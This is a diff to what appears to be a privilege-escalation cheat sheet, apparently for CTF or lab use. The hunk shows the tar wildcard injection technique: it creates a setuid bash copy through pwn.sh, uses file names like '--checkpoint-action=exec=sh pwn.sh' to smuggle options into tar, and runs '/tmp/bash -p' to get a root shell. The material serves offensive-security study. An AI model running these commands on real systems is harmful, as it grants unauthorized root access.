@@ -795,14 +795,17 @@ Solution:
 cd /opt/admin
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > \
 /opt/admin/pwn.sh
+
 touch /opt/admin/--checkpoint=1
 touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
 touch /tmp/backup.tar.gz
 
-/tmp/bash -p
-
 The Actual Bash Interpretation:
 /opt/admin: tar -zxf /tmp/backup.tar.gz --checkpoint-action=exec=sh pwn.sh  --checkpoint=1  pwn.sh
+```
+To Exploit:
+```
+/tmp/bash -p
 ```
 ### Insecure file permission /etc/passwd
  ```
